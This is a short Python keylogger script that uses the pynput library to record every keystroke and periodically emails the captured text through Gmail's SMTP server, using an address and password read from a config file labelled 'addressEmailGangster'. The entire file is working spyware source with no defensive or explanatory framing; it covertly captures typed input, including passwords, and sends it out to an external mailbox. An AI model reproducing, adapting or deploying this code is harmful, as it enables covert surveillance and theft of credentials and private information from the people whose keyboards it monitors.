import json
from pynput.keyboard import Key, Listener
import smtplib, ssl


def sendEmail(message):
    global server
    smtp_server = "smtp.gmail.com"
    port = 587
    file = open('config.json', 'r')
    array = json.loads(file.read())
    file.close()
    email1 = str(array['addressEmailGangster']['email'])
    password = str(array['addressEmailGangster']['password'])

    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(email1, password)
        server.sendmail(email1, email1, message)

    except Exception as e:
        print(e)
    finally:
        server.quit()


file = open('config.json', 'r')
array = json.loads(file.read())
print(array)
file.close()
count = array['keyCountMaxPerSubmit']
keys = []


def on_press(key):
    print(key, end=" \n")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 50:
        count = 0
        active_process(keys)


def active_process(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":
            k = " "
        elif key.find("Key") > 0:
            k = ""
        message += k
    print(message)
    sendEmail(message)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
